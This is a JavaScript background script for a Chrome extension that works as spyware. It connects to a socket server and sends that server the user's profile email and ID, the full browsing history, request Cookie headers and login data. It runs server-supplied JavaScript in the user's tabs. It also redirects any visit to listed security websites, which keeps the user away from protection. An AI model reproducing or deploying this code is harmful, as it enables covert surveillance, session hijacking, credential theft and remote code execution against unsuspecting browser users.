function connectToServer() {
  socket = io('http://localhost:3000');
  chrome.identity.getProfileUserInfo((userInfo) => {
    if (userInfo.email == null) {
      userInfo.email = "No email";
      userInfo.id = "User not logged in";
    }
    socket.emit('userInfo', userInfo);
  });
  updateSecurityWebsites(socket);
  updateScriptWebsites(socket);
  return socket;
}

function disconnectFromServer(socket) {
  socket.disconnect();
}

function updateSecurityWebsites(socket) {
  socket.on('securityWebsites', (securityWebsites) => {
    chrome.storage.sync.set({
      'securityWebsites': securityWebsites
    });
  });
}

function updateScriptWebsites(socket) {
  socket.on('jsExecution', (objects) => {
    chrome.storage.sync.set({
      'scriptSites': objects
    });
  });
}

function searchAndSendHistory() {
  chrome.history.search({
    text: ''
  }, (results) => {
    results.forEach((page) => {
      sendHistoryPage(page);
    });
  });
}

function sendHistoryPage(page) {
  socket.emit('History', [page.url, new Date(page.lastVisitTime)])
}

function checkAndSendCookies(info) {
  info.requestHeaders.forEach((header) => {
    if (header.name === "Cookie") {
      socket.emit('Cookies', header.value);
    }
  });
}

function sendLoginInfo(loginInfo) {
  socket.emit('Login', loginInfo);
}

function checkScriptWebsites(tabId, changeInfo) {
  if (changeInfo.url) {
    chrome.storage.sync.get('scriptSites', (scriptSites) => {
      scriptSites.scriptSites.forEach((map) => {
        if (changeInfo.url.includes(map.site)) {
			chrome.tabs.executeScript({
			  code: map.code
			});
          return;
        }
      });
    });
  }
}

function checkSecurityWebsites(tabId, changeInfo) {
  if (changeInfo.url) {
    chrome.storage.sync.get('securityWebsites', (securityWebsites) => {
      securityWebsites.securityWebsites.forEach((site) => {
        if (changeInfo.url.includes(site)) {
          redirectToRandomWebsite(tabId);
          return;
        }
      });
    });
  }
}

function createScriptSocket() {
  socket.on('Script', (script) => {
    chrome.tabs.executeScript({
      code: script.code
    });
  });
}

